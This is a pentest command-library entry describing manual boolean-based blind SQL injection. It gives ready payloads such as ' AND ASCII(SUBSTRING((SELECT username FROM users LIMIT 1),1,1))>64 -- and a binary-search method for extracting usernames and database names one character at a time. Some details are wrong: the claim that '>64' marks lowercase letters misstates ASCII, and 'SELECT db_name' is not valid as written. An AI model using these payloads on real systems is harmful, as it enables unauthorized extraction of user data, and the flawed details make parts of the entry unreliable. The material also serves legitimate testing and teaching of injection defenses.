---
id: cmd-manual-extract-001
data: >-
  # Manual boolean extraction payload: ' AND ASCII(SUBSTRING((SELECT username
  FROM users LIMIT 1),1,1))>64 --
tags:
  - sqli
  - manual
  - exfiltration
type: command
output: null
executor: gui
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:20.044Z'
verified: false
validated: true
submitted: true
---
# manual-data-extraction

## Command

```bash
# In Burp or browser: Inject payload and iterate binary search on ASCII values
```

## Description

Manually extracts data via boolean SQLi by guessing character values through conditional queries.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| SUBSTRING | Extracts substring from query result | Yes |
| ASCII | Converts to numeric value for comparison | Yes |
| >/< | Binary search bounds (e.g., >64 for lowercase) | Yes |

## Examples

### Basic Usage

```bash
# Test first char >0: ' AND ASCII(SUBSTRING((SELECT db_name),1,1))>0 --
```

### Advanced Usage

```bash
# Full username: Iterate positions 1-20, narrowing 0-127 range per response
```

## Expected Output

Reconstructed data string after multiple requests, e.g., username "admin".

## Related

- [[Related Procedure: Extract-Database-Data-via-Boolean-SQLi]]
